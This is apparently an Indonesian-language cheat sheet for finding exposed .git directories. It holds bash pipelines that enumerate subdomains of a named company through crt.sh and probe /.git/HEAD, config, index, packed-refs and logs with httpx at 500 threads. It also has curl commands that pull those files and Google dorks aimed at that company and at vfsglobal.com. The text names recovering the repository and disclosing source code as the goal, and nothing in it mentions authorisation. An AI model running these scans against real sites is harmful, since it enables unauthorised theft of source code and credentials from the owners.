# Git Expossure

## Single Target 

```bash
curl -s "https://crt.sh/?q=%25.onevasco.com&output=json" \
| jq -r '.[].name_value' \
| sed 's/\*\.//g' \
| sort -u \
| sed 's#$#/.git/HEAD#' \
| httpx -silent -content-length -status-code -timeout 3 -retries 0 -threads 500 -title
```

## Scan dari domains.txt

> domains.txt berisi list subdomain

```bash
cat domains.txt \
| sed 's#$#/.git/HEAD#' \
| httpx -silent -content-length -status-code -timeout 3 -retries 0 -threads 500 -title
```

## Cek file Git lain selain HEAD

```bash
while read domain; do
    echo "$domain/.git/HEAD"
    echo "$domain/.git/config"
    echo "$domain/.git/index"
    echo "$domain/.git/packed-refs"
    echo "$domain/.git/ORIG_HEAD"
    echo "$domain/.git/logs/HEAD"
done < domains.txt \
| httpx -silent -content-length -status-code -timeout 3 -retries 0 -threads 500 -title
```

## Fokus hanya status menarik

```bash
while read domain; do
    echo "$domain/.git/HEAD"
    echo "$domain/.git/config"
    echo "$domain/.git/index"
done < domains.txt \
| httpx -silent -mc 200,206,403 -content-length -title
```

## Jika menemukan .git/HEAD

Expected response:

```text
ref: refs/heads/main
```

atau

```text
ref: refs/heads/master
```

Jika muncul seperti di atas, lanjutkan pengecekan:

```bash
curl -s https://target.com/.git/config
curl -s https://target.com/.git/packed-refs
curl -s https://target.com/.git/logs/HEAD
```

## Google Dork

Cari file Git yang sudah terindex:

```text
site:onevasco.com ".git/HEAD"
```

```text
site:onevasco.com ".git/config"
```

```text
site:onevasco.com ".git/index"
```

```text
site:onevasco.com ".git/packed-refs"
```

```text
site:onevasco.com "ref: refs/heads"
```

```text
site:onevasco.com intitle:"Index of" ".git"
```

```text
site:*.onevasco.com ".git"
```

```text
site:*.vfsglobal.com ".git"
```

## Yang dicari

```text
200 /.git/HEAD
200 /.git/config
200 /.git/index
200 /.git/packed-refs
206 Partial Content
403 Forbidden
```

## Prioritas tertinggi

```text
/.git/config
/.git/index
/.git/packed-refs
/.git/logs/HEAD
```

Karena biasanya memungkinkan recovery repository atau pengungkapan source code.

